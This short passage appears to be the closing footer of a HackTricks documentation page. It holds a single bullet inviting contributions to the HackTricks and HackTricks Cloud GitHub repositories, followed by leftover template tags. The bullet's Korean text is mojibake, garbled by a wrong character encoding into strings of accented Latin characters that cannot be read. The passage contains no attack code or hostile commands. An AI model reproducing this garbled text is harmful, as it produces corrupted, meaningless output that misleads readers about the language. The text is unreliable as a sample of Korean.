* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
